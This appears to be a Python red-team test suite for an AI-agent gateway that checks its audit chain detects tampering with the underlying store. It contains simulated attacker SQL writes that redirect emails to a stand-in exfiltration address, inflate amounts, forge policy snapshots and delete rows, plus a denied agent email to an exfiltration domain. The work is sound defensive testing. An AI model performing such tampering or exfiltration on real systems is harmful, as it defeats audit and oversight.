"""Reconstruction hardening: the audit chain must say what happened, and catch a store that
was rewritten after the fact.

The store holds what the gate acted on (approval rows with their args, outbox emails, parts
orders, refunds, notes, policy snapshots); the Panoptes chain holds what the gate decided.
An attacker with write access to the store file but not the chain could rewrite an approved
email's recipients, an order's amount or an approval's args and hash, and the store alone
would never show it. These scenarios check that the chain carries enough (args hashes,
recipient counts, amounts, the row each tool wrote, the approval's own hash, each policy
version's bundle hash and every operator action) to catch that with `check_store`, which
`agentgate audit check-store` runs, and to answer from the log who did what under which
policy.

The arena's events are copied, in order, into a Panoptes log in a temporary directory and
read back with `read_events`, as `agentgate audit show` and `check-store` read the real one.
Scenarios that need a store to outlive a process open file worlds in a temporary directory
(`_Files`) on the arena's clock, with their own Panoptes log, recording their opens as the
CLI does; agent-side calls on them go over the arena's transport.

Check names and details carry no ids, paths or timestamps, so results stay deterministic.
"""

import json
import shutil
import sqlite3
import tempfile
from collections.abc import Iterator
from contextlib import ExitStack, closing, contextmanager
from datetime import timedelta
from decimal import Decimal
from pathlib import Path
from types import TracebackType
from typing import Self

from pydantic import JsonValue

from agentgate.approvals import args_hash
from agentgate.audit.base import AuditEvent, EventKind, OperatorAction
from agentgate.audit.panoptes import PanoptesSink, read_events
from agentgate.context import RunContext
from agentgate.gate import Outcome, PendingApproval
from agentgate.gateway.server import build_gateway
from agentgate.models import Action
from agentgate.redteam.core import Arena, Category, scenario
from agentgate.redteam.transport import Direct, GatewaySession, GatewaySessions, Transport
from agentgate.spend import Reservation
from agentgate.world import (
    DEFAULT_FIXTURES,
    DEFAULT_POLICIES,
    OpenRecord,
    OperatorReason,
    StoreCheck,
    World,
    bundle_sha256,
    check_store,
    open_world,
    reinstate_user,
    suspend_user,
)

AI = Category.AUDIT_INTEGRITY
KC = "kettle-creek-hvac"
JR = "juniper-row-apothecary"
OWNER = "kc-owner-dale"
MANAGER = "kc-mgr-marisol"
APPROVER = "kc-mgr-terrence"
STAFF = "kc-staff-nadine"
OTHER_STAFF = "kc-staff-priya"
JR_STAFF = "jr-staff-priya"
JR_APPROVER = "jr-mgr-daniel"

BEATRICE = "beatrice.l@mail-sample.example"
COLLEAGUES = ["terrence@kettlecreek.example", "dale@kettlecreek.example"]
EXFIL = "records-review@exfil-drop.example"
FORGED = "harvest@exfil-drop.example"
SUBJECT = "Your Wrenfield tune-up"
BODY = "Hello, Wrenfield here: our technician arrives Monday between 9 and 11."
NOTE_TEXT = "Wrenfield follow-up: call back about the condenser fan."
UNKNOWN_DOC = "beatrice-lindqvist-medical-history"
LEASE = timedelta(minutes=15)

# Text that must never appear in the chain: subjects, bodies, addresses, note text.
NEVER_LOGGED = ("Wrenfield", BEATRICE, EXFIL, FORGED, *COLLEAGUES, UNKNOWN_DOC)


def _email(to: list[str], subject: str = SUBJECT, body: str = BODY) -> dict[str, JsonValue]:
    recipients: list[JsonValue] = [*to]
    return {"to": recipients, "subject": subject, "body": body}


def _order(amount: str) -> dict[str, JsonValue]:
    return {"part": "igniter", "quantity": 2, "amount_usd": amount}


def _refund() -> dict[str, JsonValue]:
    return {
        "order_id": "JR-26-1061",
        "amount_usd": "40.00",
        "reason": "Wrenfield jar arrived cracked in transit.",
    }


# The chain, as the real log stores it


@contextmanager
def _chain(arena: Arena) -> Iterator[tuple[bool, list[AuditEvent], bytes]]:
    """(whether every event was stored and the chain verifies, the events read back from
    the Panoptes file, the file's bytes)."""
    with tempfile.TemporaryDirectory() as directory:
        path = Path(directory) / "audit.db"
        sink = PanoptesSink(path)
        events = arena.events()
        try:
            for event in events:
                sink.record(event)
            intact = sink.count() == len(events) and sink.verify()["valid"] is True
        finally:
            sink.close()
        stored = read_events(path)
        raw = b"".join(p.read_bytes() for p in sorted(path.parent.glob("audit.db*")))
        yield intact and len(stored) == len(events), stored, raw


def _problems(result: StoreCheck, kind: str | None = None) -> list[str]:
    """The mismatch phrases, for one kind of row or all, sorted: no ids."""
    return sorted(m.problem for m in result.mismatches if kind is None or m.kind == kind)


def _expect_clean(arena: Arena, result: StoreCheck, name: str) -> None:
    arena.expect(name, result.ok and not result.unchecked, "; ".join(_problems(result)))


def _expect_problem(arena: Arena, result: StoreCheck, kind: str, problem: str, name: str) -> None:
    found = _problems(result, kind)
    arena.expect(name, problem in found, "; ".join(found) or "no mismatch")


def _check(arena: Arena, customer_id: str = KC) -> StoreCheck:
    with _chain(arena) as (_, events, _raw):
        return check_store(arena.store, events, customer_id)


def _execute_approved(
    arena: Arena, ctx: RunContext, tool: str, args: dict[str, JsonValue], approver: str
) -> str | None:
    """Request, approve and run one call; the approval id, or None if it did not queue."""
    pending = arena.call(ctx, tool, args)
    if not arena.expect_pending(pending, f"{tool} needs approval"):
        return None
    assert isinstance(pending, PendingApproval)
    arena.approve(pending.approval_id, approver)
    arena.expect_executed(
        arena.execute(ctx, pending.approval_id, tool, args), f"approved {tool} runs"
    )
    return pending.approval_id


def _sql(arena: Arena, statement: str, params: tuple[str, ...]) -> int:
    """What an attacker with the store file does: one write straight to SQLite."""
    with arena.store.transaction():
        return arena.store.connection.execute(statement, params).rowcount


@scenario("ai-020", AI, "Approval args rewritten in the store are caught against the chain")
def rewritten_approvals_are_caught(arena: Arena) -> None:
    staff = arena.start(STAFF)
    email = _email([BEATRICE])
    ran = _execute_approved(arena, staff, "email.send", email, APPROVER)
    waiting = arena.call(staff, "email.send", _email([BEATRICE], subject="Your Wrenfield quote"))
    arena.expect_pending(waiting, "a second email waits for approval")
    if ran is None or not isinstance(waiting, PendingApproval):
        return
    _expect_clean(arena, _check(arena), "the honest store checks clean")

    # The waiting approval's recipient is swapped. Its stored hash no longer fits its args.
    row = arena.gate.approvals.get(waiting.approval_id)
    assert row is not None
    forged: list[JsonValue] = [FORGED]
    swapped: dict[str, JsonValue] = {**row.args, "to": forged}
    _sql(
        arena,
        "UPDATE approvals SET args = ? WHERE id = ?",
        (json.dumps(swapped), waiting.approval_id),
    )
    _expect_problem(
        arena,
        _check(arena),
        "approval",
        "args do not match the row's args_hash",
        "swapped args are caught",
    )

    # The hash is rewritten to fit: the store is consistent again, the chain is not.
    rehashed = args_hash(row.tool, row.action, swapped)
    _sql(arena, "UPDATE approvals SET args_hash = ? WHERE id = ?", (rehashed, waiting.approval_id))
    result = _check(arena)
    _expect_problem(
        arena, result, "approval", "args_hash differs from the chain", "a rehashed row is caught"
    )
    arena.expect(
        "the honest approval still checks clean",
        all(m.id != ran for m in result.mismatches),
        "; ".join(_problems(result)),
    )

    # Rewriting the executed approval back to approved, so it could run again, shows too.
    _sql(arena, "UPDATE approvals SET status = 'approved' WHERE id = ?", (ran,))
    _expect_problem(
        arena,
        _check(arena),
        "approval",
        "status differs from the chain",
        "a reopened approval is caught",
    )
    # And so does a changed approver.
    _sql(arena, "UPDATE approvals SET decided_by = ? WHERE id = ?", (OWNER, ran))
    _expect_problem(
        arena,
        _check(arena),
        "approval",
        "approver differs from the chain",
        "a changed approver is caught",
    )
    with _chain(arena) as (intact, _, raw):
        arena.expect("the chain itself verifies", intact)
        arena.expect("no address or text on the chain", not _logged(raw))


def _logged(raw: bytes) -> list[str]:
    return [text for text in NEVER_LOGGED if text.encode() in raw]


@scenario("ai-021", AI, "Side-effect rows edited after the fact are caught against the chain")
def rewritten_side_effects_are_caught(arena: Arena) -> None:
    staff = arena.start(STAFF)
    manager = arena.start(MANAGER)
    jr_staff = arena.start(JR_STAFF)
    arena.expect_executed(arena.call(staff, "email.send", _email(COLLEAGUES)), "internal email")
    _execute_approved(arena, staff, "email.send", _email([BEATRICE]), APPROVER)
    arena.expect_executed(arena.call(manager, "parts.order", _order("480.00")), "480 USD order")
    arena.expect_executed(
        arena.call(
            manager, "notes.write", {"title": "Call back", "body": NOTE_TEXT, "label": "internal"}
        ),
        "note written",
    )
    _execute_approved(arena, jr_staff, "refund.issue", _refund(), JR_APPROVER)
    _expect_clean(arena, _check(arena), "the honest store checks clean")
    _expect_clean(arena, _check(arena, JR), "the honest refunds check clean")

    emails = arena.outbox()
    orders = arena.parts_orders()
    refunds = arena.refunds()
    if len(emails) != 2 or len(orders) != 1 or len(refunds) != 1:
        arena.expect("every side effect was written", False, f"{len(emails)} emails")
        return
    # The approved customer email is redirected; the count is unchanged, the content is not.
    _sql(
        arena,
        "UPDATE outbox SET recipients = ? WHERE id = ?",
        (json.dumps([FORGED]), emails[1].id),
    )
    _expect_problem(
        arena,
        _check(arena),
        "email.send",
        "content differs from the chain",
        "a redirected email is caught",
    )
    # A recipient is added to the internal email.
    _sql(
        arena,
        "UPDATE outbox SET recipients = ? WHERE id = ?",
        (json.dumps([*COLLEAGUES, FORGED]), emails[0].id),
    )
    _expect_problem(
        arena,
        _check(arena),
        "email.send",
        "recipient count differs from the chain",
        "an added recipient is caught",
    )
    # An email no run sent is planted in the outbox.
    _sql(
        arena,
        "INSERT INTO outbox (id, run_id, customer_id, recipients, subject, body, created_at)"
        " VALUES (?, ?, ?, ?, ?, ?, ?)",
        ("email-planted", staff.run_id, KC, json.dumps([FORGED]), SUBJECT, BODY, "2026-10-22"),
    )
    _expect_problem(
        arena,
        _check(arena),
        "email.send",
        "no executed event names this row",
        "a planted email is caught",
    )
    # The order's amount is raised, and the refund's.
    _sql(arena, "UPDATE parts_orders SET amount_usd = '4800.00' WHERE id = ?", (orders[0].id,))
    result = _check(arena)
    _expect_problem(
        arena, result, "parts.order", "amount differs from the chain", "a raised order is caught"
    )
    _sql(arena, "UPDATE refunds SET amount_usd = '400.00' WHERE id = ?", (refunds[0].id,))
    _expect_problem(
        arena,
        _check(arena, JR),
        "refund.issue",
        "amount differs from the chain",
        "a raised refund is caught",
    )
    # The note's text is rewritten.
    note = [d for d in arena.store.list_documents(KC) if "note" in d.tags]
    if note:
        _sql(arena, "UPDATE documents SET body = 'rewritten' WHERE id = ?", (note[0].id,))
    _expect_problem(
        arena,
        _check(arena),
        "notes.write",
        "content differs from the chain",
        "a rewritten note is caught",
    )
    # The order row is deleted outright.
    _sql(arena, "DELETE FROM parts_orders WHERE id = ?", (orders[0].id,))
    _expect_problem(
        arena,
        _check(arena),
        "parts.order",
        "row named by an executed event is missing",
        "a deleted order is caught",
    )
    with _chain(arena) as (intact, _, raw):
        arena.expect("the chain itself verifies", intact)
        arena.expect("no address, subject, body or note text on the chain", not _logged(raw))


# File worlds


class _Files:
    """A temporary store, Panoptes log and policy copy, opened as the CLI would open them."""

    def __init__(self, arena: Arena) -> None:
        self._arena = arena
        self._stack = ExitStack()
        self._tmp = Path(self._stack.enter_context(tempfile.TemporaryDirectory()))
        self._sessions = GatewaySessions()
        self._by_run: dict[tuple[int, str], GatewaySession] = {}
        self._worlds: list[World] = []
        self.db = self._tmp / "data" / "agentgate.db"
        self.audit = self._tmp / "data" / "audit.db"
        self.policies = self._tmp / "policies"
        self.fixtures = self._tmp / "fixtures"
        shutil.copytree(arena.world.policies or DEFAULT_POLICIES, self.policies)
        shutil.copytree(arena.world.fixtures or DEFAULT_FIXTURES, self.fixtures)

    def __enter__(self) -> Self:
        return self

    def __exit__(
        self,
        exc_type: type[BaseException] | None,
        exc: BaseException | None,
        tb: TracebackType | None,
    ) -> None:
        try:
            self._sessions.close()
        finally:
            try:
                for world in self._worlds:
                    world.close()
            finally:
                self._stack.close()

    def open(self) -> World:
        world = open_world(
            db_path=self.db,
            audit_path=self.audit,
            policies=self.policies,
            fixtures=self.fixtures,
            clock=self._arena.clock,
            record_open=OpenRecord.ALL,
        )
        self._worlds.append(world)
        return world

    def close(self, world: World) -> None:
        for key in [key for key in self._by_run if key[0] == id(world)]:
            self._by_run.pop(key).close()
        self._worlds.remove(world)
        world.close()

    def events(self) -> list[AuditEvent]:
        return read_events(self.audit)

    def edit(self, path: Path, old: str, new: str) -> bool:
        text = path.read_text()
        if text.count(old) != 1:
            return False
        path.write_text(text.replace(old, new))
        return True

    def call(self, world: World, ctx: RunContext, tool: str, args: dict[str, JsonValue]) -> Outcome:
        """One agent-side call on a file world, over the arena's transport."""
        if self._arena.transport is Transport.GATE:
            self._arena.direct_calls[Direct.GATE_TRANSPORT] += 1
            config = world.engines[ctx.customer_id].bundle.tools[tool]
            return world.gate.call_tool(ctx, tool, sorted(config.actions)[0], args)
        key = (id(world), ctx.run_id)
        session = self._by_run.get(key)
        if session is None:
            session = self._sessions.open(f"{id(world)}-{ctx.run_id}", build_gateway(world, ctx))
            self._by_run[key] = session
        self._arena.mcp_calls += 1
        return session.call(tool, args).outcome


def _loaded(events: list[AuditEvent], version: str) -> list[AuditEvent]:
    return [
        e
        for e in events
        if e.kind is EventKind.POLICY_LOADED and e.customer_id == KC and e.policy_version == version
    ]


def _rule_limit(bundle_text: str, rule_id: str) -> object:
    bundle = json.loads(bundle_text)
    for rule in bundle.get("policy", {}).get("rules", []):
        if rule.get("id") == rule_id:
            return (rule.get("where") or {}).get("amount_usd_lte")
    return None


@scenario("ai-022", AI, "A policy changed between opens is recoverable by its version")
def changed_policy_is_recoverable(arena: Arena) -> None:
    with _Files(arena) as files:
        first = files.open()
        old = first.engines[KC].version
        manager = first.gate.start_run(KC, MANAGER)
        arena.expect_executed(
            files.call(first, manager, "parts.order", _order("480.00")),
            name="a 480 USD order runs under the old policy",
        )
        files.close(first)

        # The allow limit drops to 300 USD, and approval starts above 300.
        policy = files.policies / KC / "policy.yaml"
        changed = files.edit(policy, 'amount_usd_lte: "500.00"', 'amount_usd_lte: "300.00"')
        changed = (
            files.edit(policy, 'amount_usd_gt: "500.00"', 'amount_usd_gt: "300.00"') and changed
        )
        arena.expect("the policy was edited", changed)
        second = files.open()
        new = second.engines[KC].version
        arena.expect("the edit is a new version", new != old)
        manager = second.gate.start_run(KC, MANAGER)
        arena.expect_pending(
            files.call(second, manager, "parts.order", _order("480.00")),
            name="the same order now needs approval",
        )
        snapshots = {v: second.store.get_policy_snapshot(v) for v in (old, new)}
        files.close(second)

        events = files.events()
        orders = [
            e for e in events if e.tool == "parts.order" and e.kind is not EventKind.RUN_STARTED
        ]
        arena.expect(
            "each decision names the version it was made under",
            [e.policy_version for e in orders if e.kind is EventKind.ALLOW] == [old]
            and [e.policy_version for e in orders if e.kind is EventKind.APPROVAL_REQUIRED]
            == [new],
            f"{len(orders)} order events",
        )
        # The canonical bundle writes amounts normalised: "500.00" is "500".
        for label, version, limit in (("old", old, "500"), ("new", new, "300")):
            snapshot = snapshots[version]
            loaded = _loaded(events, version)
            arena.expect(f"the {label} version has a snapshot", snapshot is not None)
            arena.expect(f"the {label} version was loaded on the chain", len(loaded) >= 1)
            if snapshot is None or not loaded:
                continue
            digest = bundle_sha256(snapshot.bundle)
            arena.expect(
                f"the {label} snapshot matches the chain",
                all(e.details.get("bundle_sha256") == digest for e in loaded)
                and version == "sha256:" + digest[:16],
            )
            arena.expect(
                f"the {label} snapshot says what that policy said",
                _rule_limit(snapshot.bundle, "parts-order-up-to-500") == limit,
                str(_rule_limit(snapshot.bundle, "parts-order-up-to-500")),
            )

        # Someone rewrites the old snapshot to say the limit was always 300.
        with closing(sqlite3.connect(files.db)) as conn, conn:
            stored = conn.execute(
                "SELECT bundle FROM policy_snapshots WHERE version = ?", (old,)
            ).fetchone()
            if stored is not None:
                forged = str(stored[0]).replace('"500"', '"300"')
                conn.execute(
                    "UPDATE policy_snapshots SET bundle = ? WHERE version = ?", (forged, old)
                )
        third = files.open()
        snapshot = third.store.get_policy_snapshot(old)
        files.close(third)
        loaded = _loaded(files.events(), old)
        arena.expect(
            "a rewritten snapshot no longer matches the chain",
            snapshot is not None
            and bool(loaded)
            and all(
                e.details.get("bundle_sha256") != bundle_sha256(snapshot.bundle) for e in loaded
            ),
        )


def _operator(events: list[AuditEvent], action: OperatorAction) -> list[AuditEvent]:
    return [
        e
        for e in events
        if e.kind is EventKind.OPERATOR_ACTION and e.details.get("action") == action.value
    ]


@scenario("ai-023", AI, "Operator suspensions, sweeps and fixture changes are on the chain")
def operator_actions_are_recorded(arena: Arena) -> None:
    live = arena.start(OTHER_STAFF)
    suspend_user(arena.world, OTHER_STAFF, acting_user_id=OWNER, reason=OperatorReason.SECURITY)
    arena.expect_denied(
        arena.call(live, "docs.read", {"document_id": "kc-dispatch-procedure"}),
        "suspended_user",
        name="the suspended user's live run is refused",
    )
    reinstate_user(arena.world, OTHER_STAFF, acting_user_id=OWNER, reason=OperatorReason.RESOLVED)

    # Hosts of both customers die holding model reservations; a KC owner sweeps them all.
    kc_runs = [arena.start(STAFF) for _ in range(3)]
    jr_runs = [arena.start(JR_STAFF) for _ in range(2)]
    held = [arena.gate.charge_model(ctx, Decimal("0.25")) for ctx in [*kc_runs, *jr_runs]]
    arena.expect("five reservations held", all(isinstance(r, Reservation) for r in held))
    arena.advance(16)
    owner = arena.store.get_user(OWNER)
    assert owner is not None
    released = arena.gate.release_stale(LEASE, actor=owner)
    arena.expect("the sweep releases all five", released == 5, f"{released}")

    with _chain(arena) as (intact, events, raw):
        arena.expect("the chain verifies", intact)
        suspended = _operator(events, OperatorAction.USER_SUSPENDED)
        arena.expect(
            "the suspension names actor, target and reason",
            [(e.user_id, e.subject, e.details.get("reason")) for e in suspended]
            == [(OWNER, OTHER_STAFF, "security")],
            f"{len(suspended)} events",
        )
        reinstated = _operator(events, OperatorAction.USER_REINSTATED)
        arena.expect(
            "the reinstatement names actor, target and reason",
            [(e.user_id, e.subject, e.details.get("reason")) for e in reinstated]
            == [(OWNER, OTHER_STAFF, "resolved")],
            f"{len(reinstated)} events",
        )
        sweeps = {
            e.customer_id: e for e in _operator(events, OperatorAction.STALE_RESERVATIONS_RELEASED)
        }
        kc, jr = sweeps.get(KC), sweeps.get(JR)
        arena.expect(
            "each customer's sweep is counted with its total and runs",
            kc is not None
            and jr is not None
            and (kc.details.get("released"), kc.details.get("released_usd")) == (3, "0.75")
            and (jr.details.get("released"), jr.details.get("released_usd")) == (2, "0.50")
            and sorted(str(r) for r in _as_list(kc.details.get("run_ids")))
            == sorted(ctx.run_id for ctx in kc_runs)
            and sorted(str(r) for r in _as_list(jr.details.get("run_ids")))
            == sorted(ctx.run_id for ctx in jr_runs),
        )
        arena.expect(
            "the sweeping owner is named only in their own customer's log",
            kc is not None
            and kc.user_id == OWNER
            and jr is not None
            and jr.user_id is None
            and jr.details.get("actor") == "operator"
            and OWNER.encode() not in _event_bytes(jr),
        )
        arena.expect("no user email on the chain", b"@kettlecreek.example" not in raw)

    # A role change in the fixtures, picked up when a host reopens the store.
    with _Files(arena) as files:
        files.close(files.open())
        edited = files.edit(
            files.fixtures / KC / "users.yaml",
            "email: marisol@kettlecreek.example\n  role: manager",
            "email: marisol@kettlecreek.example\n  role: staff",
        )
        arena.expect("the fixtures were edited", edited)
        files.close(files.open())
        syncs = [
            e for e in _operator(files.events(), OperatorAction.FIXTURE_SYNC) if e.customer_id == KC
        ]
        last = syncs[-1] if syncs else None
        arena.expect(
            "the fixture change is on the chain with its ids and fields",
            len(syncs) == 2
            and last is not None
            and last.details.get("users_updated") == [MANAGER]
            and last.details.get("user_fields_updated") == {MANAGER: ["role"]}
            and last.details.get("actor") == "system",
            f"{len(syncs)} sync events",
        )


def _as_list(value: JsonValue) -> list[JsonValue]:
    return value if isinstance(value, list) else []


def _event_bytes(event: AuditEvent) -> bytes:
    return event.model_dump_json().encode()


@scenario("ai-024", AI, "Decision events carry args hashes, counts and amounts, never the values")
def decisions_carry_values_not_text(arena: Arena) -> None:
    staff = arena.start(STAFF)
    manager = arena.start(MANAGER)
    internal = _email(COLLEAGUES)
    arena.expect_executed(arena.call(staff, "email.send", internal), "internal email runs")
    customer = _email([BEATRICE])
    approval_id = _execute_approved(arena, staff, "email.send", customer, APPROVER)
    arena.expect_executed(arena.call(manager, "parts.order", _order("480.00")), "480 USD order")
    arena.expect_denied(arena.call(staff, "email.send", _email([EXFIL])), name="exfil send denied")
    arena.expect_denied(
        arena.call(staff, "docs.read", {"document_id": UNKNOWN_DOC}), "not_found", "probe denied"
    )
    approval = None if approval_id is None else arena.gate.approvals.get(approval_id)

    with _chain(arena) as (intact, events, raw):
        arena.expect("the chain verifies", intact)
        emails = [e for e in events if e.tool == "email.send"]
        internal_hash = args_hash("email.send", Action.SEND, internal)
        customer_hash = args_hash("email.send", Action.SEND, customer)
        sent = [e for e in emails if e.details.get("args_hash") == internal_hash]
        arena.expect(
            "the internal send carries its args hash and counts on allow and executed",
            [e.kind for e in sent] == [EventKind.ALLOW, EventKind.EXECUTED]
            and all(
                (e.details.get("recipients"), e.details.get("recipients_internal")) == (2, 2)
                and e.details.get("recipients_external") == 0
                for e in sent
            ),
            f"{len(sent)} events",
        )
        approved = [e for e in emails if e.subject == approval_id]
        arena.expect(
            "every event of the approved send carries the approval's own hash",
            approval is not None
            and [e.kind for e in approved]
            == [
                EventKind.APPROVAL_REQUIRED,
                EventKind.APPROVED,
                EventKind.ALLOW,
                EventKind.EXECUTED,
            ]
            and all(e.details.get("approval_args_hash") == approval.args_hash for e in approved)
            and approval.args_hash == customer_hash,
            f"{len(approved)} events",
        )
        arena.expect(
            "the approved send counts one external recipient",
            all(
                e.details.get("recipients_external") == 1
                for e in approved
                if e.kind is not EventKind.APPROVED
            ),
        )
        outbox = arena.outbox()
        effects = [e.details.get("effect_ref") for e in emails if e.kind is EventKind.EXECUTED]
        arena.expect(
            "each executed send names its outbox row",
            effects == [row.id for row in outbox],
            f"{len(effects)} refs",
        )
        orders = [e for e in events if e.tool == "parts.order"]
        rows = arena.parts_orders()
        arena.expect(
            "the order carries its amount and names its row",
            [(e.kind, e.details.get("amount_usd")) for e in orders]
            == [(EventKind.ALLOW, "480.00"), (EventKind.EXECUTED, "480.00")]
            and bool(rows)
            and orders[-1].details.get("effect_ref") == rows[0].id,
        )
        denied = [e for e in emails if e.kind is EventKind.DENY]
        arena.expect(
            "the denied exfil send carries its hash and external count",
            len(denied) == 1
            and isinstance(denied[0].details.get("args_hash"), str)
            and denied[0].details.get("recipients_external") == 1,
        )
        probe = [e for e in events if e.tool == "docs.read" and e.kind is EventKind.DENY]
        arena.expect(
            "a probe of an unknown document carries no args hash",
            len(probe) == 1 and "args_hash" not in probe[0].details,
        )
        arena.expect("no subject, body or address on the chain", not _logged(raw))
        arena.expect("the store checks clean against it", check_store(arena.store, events, KC).ok)
